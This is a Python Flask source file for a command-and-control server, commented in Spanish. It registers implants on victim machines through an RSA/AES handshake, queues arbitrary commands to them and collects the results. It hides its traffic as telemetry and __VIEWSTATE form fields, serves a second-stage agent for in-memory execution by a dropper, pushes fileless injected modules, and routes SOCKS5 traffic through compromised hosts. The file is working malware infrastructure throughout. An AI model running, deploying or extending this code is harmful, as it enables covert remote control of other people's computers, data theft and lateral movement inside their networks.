import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.DEBUG)

from flask import Flask, request, render_template, jsonify, redirect, url_for, session as flask_session
import json, base64, urllib.parse, os, time, uuid, hashlib, socket, select, threading

try:
    from Crypto.Cipher import AES, PKCS1_OAEP
    from Crypto.PublicKey import RSA
    from Crypto.Util.Padding import pad, unpad
    AES_AVAILABLE = True
except ImportError:
    AES_AVAILABLE = False

app = Flask(__name__)
app.secret_key = os.urandom(24)

# =========================================================
# ESTADO DEL SERVIDOR Y BD
# =========================================================
DB_FILE = 'c2_database.json'
agentes_activos = {}
tareas_pendientes = {}   # { agent_id: [{'command': '...', 'task_id': '...'}, ...] }
resultados_tareas = {}   # { task_id: {'output': '...', 'error': '...'} }

def load_state():
    global agentes_activos
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, 'r') as f:
                agentes_activos = json.load(f)
            print(f"[+] Cargados {len(agentes_activos)} Beacons desde la Base de Datos.")
        except Exception as e:
            print(f"[-] Error leyendo la DB: {e}")

def save_state():
    try:
        with open(DB_FILE, 'w') as f:
            json.dump(agentes_activos, f, indent=4)
    except Exception as e:
        pass

load_state()

# =========================================================
# CRIPTOGRAFÍA DINÁMICA (RSA + AES)
# =========================================================
# Generamos la infraestructura PKI (Public Key Infrastructure) del C2
if AES_AVAILABLE:
    print("[*] Generando KeyPair RSA-2048 del servidor C2...")
    rsa_keypair = RSA.generate(2048)
    C2_PUBLIC_KEY = rsa_keypair.publickey().export_key().decode('utf-8')
    rsa_cipher = PKCS1_OAEP.new(rsa_keypair)
else:
    C2_PUBLIC_KEY = "NO_RSA"
    rsa_cipher = None

class AESCipher:
    def __init__(self, key: bytes):
        if AES_AVAILABLE:
            self.key = hashlib.sha256(key).digest() if len(key) != 32 else key
            
    def decrypt(self, encrypted_data: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in encrypted_data])
        raw = base64.b64decode(encrypted_data)
        cipher = AES.new(self.key, AES.MODE_CBC, raw[:16])
        return unpad(cipher.decrypt(raw[16:]), AES.block_size)

    def encrypt(self, plaintext: bytes) -> bytes:
        if not AES_AVAILABLE: return bytes([b ^ 0x42 for b in plaintext])
        iv = os.urandom(16)
        cipher = AES.new(self.key, AES.MODE_CBC, iv)
        ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
        return base64.b64encode(iv + ciphertext)

def get_agent_cipher(agent_id: str):
    # Obtener el AES Cipher único del agente negociado por RSA
    agent = agentes_activos.get(agent_id, {})
    key_b64 = agent.get('aes_key_b64')
    if key_b64:
        key = base64.b64decode(key_b64)
    else:
        key = b'C2ProjectEduKey2024!SecureKey32b' # Fallback legacy
    return AESCipher(key)

def decode_payload(b64_encoded: str, agent_id: str):
    cipher = get_agent_cipher(agent_id)
    try:
        decrypted = cipher.decrypt(b64_encoded.encode('utf-8'))
        return json.loads(decrypted.decode('utf-8'))
    except Exception as e:
        return None

def encode_payload(data: dict, agent_id: str):
    cipher = get_agent_cipher(agent_id)
    json_data = json.dumps(data).encode('utf-8')
    return cipher.encrypt(json_data).decode('utf-8')

# =========================================================
# RUTAS DE AGENTES (BEACONS & HANDSHAKES)
# =========================================================

@app.route('/api/v2/get_cert', methods=['GET'])
def get_cert():
    # El agente descarga la llave pública antes de nacer
    return jsonify({'public_key': C2_PUBLIC_KEY})

@app.route('/api/v2/handshake', methods=['POST'])
def agent_handshake():
    # El agente envía su ID y su clave AES cifrada con RSA
    data = request.json
    agent_id = data.get('id')
    enc_aes_b64 = data.get('encrypted_aes')
    info = data.get('info', {})
    
    if agent_id and enc_aes_b64 and rsa_cipher:
        try:
            enc_aes = base64.b64decode(enc_aes_b64)
            aes_key = rsa_cipher.decrypt(enc_aes) # Extraemos la llave AES cruda
            
            # Registrar agente con su llave única
            agentes_activos[agent_id] = {
                'ip': request.remote_addr,
                'hostname': info.get('hostname', 'Unknown'),
                'os': info.get('os', 'Unknown'),
                'user': info.get('username', 'Unknown'),
                'last_seen': time.strftime("%H:%M:%S"),
                'aes_key_b64': base64.b64encode(aes_key).decode('utf-8')
            }
            save_state()
            if agent_id not in tareas_pendientes:
                tareas_pendientes[agent_id] = []
            return "OK", 200
        except Exception as e:
            return str(e), 500
    return "Failed", 400

@app.route('/api/v2/telemetry', methods=['GET'])
def agent_checkin():
    cookie = request.cookies.get('session_id')
    if not cookie: return "", 200
    
    agent_id = urllib.parse.unquote(cookie)
    if agent_id in agentes_activos:
        agentes_activos[agent_id]['last_seen'] = time.strftime("%H:%M:%S")
        save_state()
    
    # Hay tareas para este agente?
    if agent_id in tareas_pendientes and tareas_pendientes[agent_id]:
        task = tareas_pendientes[agent_id].pop(0)
        return encode_payload(task, agent_id), 200
        
    return "", 200

@app.route('/api/v2/update', methods=['POST'])
def agent_response():
    cookie = request.cookies.get('session_id')
    viewstate = request.form.get('__VIEWSTATE')
    
    if cookie and viewstate:
        agent_id = urllib.parse.unquote(cookie)
        payload = decode_payload(viewstate, agent_id)
        if payload:
            task_id = payload.get('task_id')
            cmd = payload.get('command')
            
            if task_id == 'SOCKS_DOWNSTREAM':
                try:
                    socks_data = json.loads(payload.get('payload', '[]'))
                    for up_conn_id, action, up_b64 in socks_data:
                        if action == 'DATA' and up_conn_id in socks_active_tunnels:
                            socks_active_tunnels[up_conn_id].sendall(base64.b64decode(up_b64))
                        elif action == 'CLOSE' and up_conn_id in socks_active_tunnels:
                            socks_active_tunnels[up_conn_id].close()
                            del socks_active_tunnels[up_conn_id]
                except: pass
                return "", 200
            
            if cmd == 'register': # Legacy compat
                pass
            elif task_id:
                resultados_tareas[task_id] = payload
            
    return "", 200

@app.route('/stage2')
def serve_stage2():
    """Sirve agent_v2 completo al dropper Stage1 (en memoria, sin disco en víctima)."""
    ua = request.headers.get('User-Agent', '')
    if not ua:
        return '', 404
    try:
        src = 'agent_v2.py'
        if not os.path.exists(src): return '', 404
        with open(src, 'r', encoding='utf-8') as f:
            code = f.read()
        return code, 200, {'Content-Type': 'text/plain; charset=utf-8'}
    except Exception:
        return '', 500

# =========================================================
# PANEL WEB & ADMIN ROUTES
# =========================================================
def is_logged_in():
    return flask_session.get('logged_in') is True

@app.route('/')
def index():
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = request.form.get('username')
        pwd = request.form.get('password')
        if user == 'admin' and pwd == 'c2admin2026':
            flask_session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            return render_template('login.html', error="Invalid Operator Credentials")
    return render_template('login.html', error=None)

@app.route('/logout')
def logout():
    flask_session.clear()
    return redirect(url_for('login'))

@app.route('/admin/dashboard')
def dashboard():
    if not is_logged_in(): return redirect(url_for('login'))
    return render_template('dashboard.html')

# --- API AJAX para FronEnd ---
@app.route('/api/admin/beacons')
def api_get_beacons():
    if not is_logged_in(): return jsonify({'error':'Unauthorized'}), 401
    safe_data = {}
    for k, v in agentes_activos.items():
        safe_data[k] = {a:b for a,b in v.items() if a != 'aes_key_b64'}
    return jsonify(safe_data)

@app.route('/api/admin/tasks', methods=['POST'])
def api_add_task():
    if not is_logged_in(): return jsonify({'error':'Unauthorized'}), 401
    data = request.json
    agent_id = data.get('agent_id')
    cmd = data.get('command')
    args = data.get('args', '')
    
    if agent_id in agentes_activos:
        task_id = str(uuid.uuid4())[:8]
        
        if cmd == 'inject':
            mod_path = f"modules/{args}.py"
            if os.path.exists(mod_path):
                with open(mod_path, 'r', encoding='utf-8') as f:
                    script = f.read()
                task_payload = {'command': 'evaluate_in_memory', 'task_id': task_id, 'fileless_script': script, 'args': args}
                tareas_pendientes.setdefault(agent_id, []).append(task_payload)
                return jsonify({'status':'ok', 'task_id': task_id, 'msg': 'Módulo inyectado enviado.'})
            else:
                return jsonify({'error':'Módulo no encontrado'})
                
        elif cmd == 'kill':
            task_payload = {'command': 'kill', 'task_id': task_id}
            tareas_pendientes.setdefault(agent_id, []).append(task_payload)
            
            # Purgar al agente de la base de datos de forma permanente
            if agent_id in agentes_activos:
                del agentes_activos[agent_id]
                save_state()
            
            return jsonify({'status':'ok', 'task_id': task_id, 'msg': 'Kill Dispatched & System Purged'})
            
        elif cmd == 'route':
            global socks_target_agent
            socks_target_agent = agent_id
            msg = f"SOCKS5 Routing enlazado permanentemente. Todo el tráfico de Proxychains TCP a 127.0.0.1:1080 saldrá a través del Agente {agent_id}."
            return jsonify({'status':'ok', 'task_id': task_id, 'msg': msg})
            
        else:
            task_payload = {'command': cmd, 'task_id': task_id, 'args': args}
            tareas_pendientes.setdefault(agent_id, []).append(task_payload)
            return jsonify({'status':'ok', 'task_id': task_id})
            
    return jsonify({'error': 'Agent not found'}), 404

@app.route('/api/admin/results')
def api_get_results():
    if not is_logged_in(): return jsonify({'error':'Unauthorized'}), 401
    res = dict(resultados_tareas)
    resultados_tareas.clear()
    return jsonify(res)

if __name__ == '__main__':
    load_state()
    # === MÓDULO 3: SOCKS5 C2 TUNNEL ROUTER ===
    socks_active_tunnels = {}
    socks_target_agent = None

    def SOCKS5_Server():
        global socks_target_agent
        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            server.bind(('127.0.0.1', 1080))
            server.listen(10)
            print("[*] MÓDULO 3: SOCKS5 Pivot Local activado en 127.0.0.1:1080")
        except Exception as e:
            print(f"[-] No se pudo levantar SOCKS5: {e}")
            return

        while True:
            try:
                client, addr = server.accept()
                threading.Thread(target=handle_socks5_client, args=(client,), daemon=True).start()
            except: pass

    def handle_socks5_client(client):
        global socks_target_agent
        if not socks_target_agent or socks_target_agent not in agentes_activos:
            client.close()
            return
            
        try:
            client.recv(2) # version, nmethods
            client.recv(10) # methods
            client.sendall(b'\x05\x00')
            
            req = client.recv(4)
            if not req or req[1] != 1:
                client.close()
                return
            
            address_type = req[3]
            if address_type == 1: dest_addr = socket.inet_ntoa(client.recv(4))
            elif address_type == 3: dest_addr = client.recv(client.recv(1)[0]).decode()
            else:
                client.close()
                return

            dest_port = int.from_bytes(client.recv(2), 'big', signed=False)
            
            conn_id = str(uuid.uuid4())[:8]
            socks_active_tunnels[conn_id] = client
            
            task = {
                'command': 'socks_connect', 
                'task_id': f'socks_{conn_id}', 
                'args': json.dumps({'conn_id': conn_id, 'host': dest_addr, 'port': dest_port})
            }
            tareas_pendientes.setdefault(socks_target_agent, []).append(task)
            
            client.sendall(b'\x05\x00\x00\x01\x00\x00\x00\x00\x00\x00')
            
            while True:
                r, _, _ = select.select([client], [], [], 0.5)
                if r:
                    data = client.recv(8192)
                    if data:
                        t = {
                            'command': 'socks_write',
                            'task_id': f'socksw_{conn_id}',
                            'args': json.dumps({'conn_id': conn_id, 'data': base64.b64encode(data).decode('utf-8')})
                        }
                        tareas_pendientes.setdefault(socks_target_agent, []).append(t)
                    else: break
                else:
                    if conn_id not in socks_active_tunnels: break
        except: pass
        finally:
            client.close()
            if 'conn_id' in locals() and conn_id in socks_active_tunnels:
                del socks_active_tunnels[conn_id]

    threading.Thread(target=SOCKS5_Server, daemon=True).start()

    print("==================================================")
    print("   C2 TEAM SERVER (MULTIPLAYER WEB DASHBOARD)     ")
    print("==================================================")
    print("[*] Dashboard URL: https://0.0.0.0:5000")
    print("[*] Credenciales: admin / c2admin2026")
    print("[*] Sistema hibrido AES+RSA y certificado TLS adhoc activado.")
    # Bind universal con HTTPS puro via adhoc
    try:
        app.run(host='0.0.0.0', port=5000, debug=False, threaded=True, ssl_context='adhoc')
    except ImportError:
        print("[!] pyOpenSSL no encontrado. Iniciando en modo inseguro HTTP.")
        app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
